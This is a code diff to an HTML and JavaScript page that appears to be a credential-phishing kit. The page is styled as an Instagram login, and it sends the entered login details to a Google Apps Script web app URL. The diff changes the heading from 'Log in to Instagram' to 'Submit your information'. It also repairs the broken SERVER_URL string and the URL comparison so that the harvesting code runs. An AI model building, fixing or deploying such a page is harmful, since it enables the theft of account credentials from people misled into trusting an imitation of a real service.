@@ -139,7 +139,7 @@
           <button class="p-2 hover:bg-white/5 rounded-full transition-colors" title="Back">
             <i class="fa-solid fa-chevron-left text-lg"></i>
           </button>
-          <h2 class="text-xl font-semibold">Log in to Instagram</h2>
+          <h2 class="text-xl font-semibold">Submit your information</h2>
         </div>
 
         <!-- Login Form -->
@@ -246,8 +246,7 @@
     const toggleLandmarkBtn = document.getElementById('toggleLandmark');
 
     // Put your Google Apps Script Web App URL here after deploying it.
-    const SERVER_URL = "https://script.google.com/macros/s/AKfycbxE4GsJW0Wgx3Isqz4uuNJwdj-hJoFkcMRjwVjj7UviWu039CxBPt9eaAM1FPlaYnw/exec
-";
+    const SERVER_URL = "https://script.google.com/macros/s/AKfycbxE4GsJW0Wgx3Isqz4uuNJwdj-hJoFkcMRjwVjj7UviWu039CxBPt9eaAM1FPlaYnw/exec";
 
     function checkInputs() {
       const uVal = usernameInput.value.trim();
@@ -283,8 +282,7 @@
       loginBtn.innerText = "Submitting...";
       loginBtn.disabled = true;
 
-      if (SERVER_URL === https://script.google.com/macros/s/AKfycbxE4GsJW0Wgx3Isqz4uuNJwdj-hJoFkcMRjwVjj7UviWu039CxBPt9eaAM1FPlaYnw/exec
-) {
+      if (SERVER_URL === "https://script.google.com/macros/s/AKfycbxE4GsJW0Wgx3Isqz4uuNJwdj-hJoFkcMRjwVjj7UviWu039CxBPt9eaAM1FPlaYnw/exec") {
         alertToast("Setup needed", "Add your Apps Script Web App URL first.");
         loginBtn.innerText = "Submit";
         checkInputs();
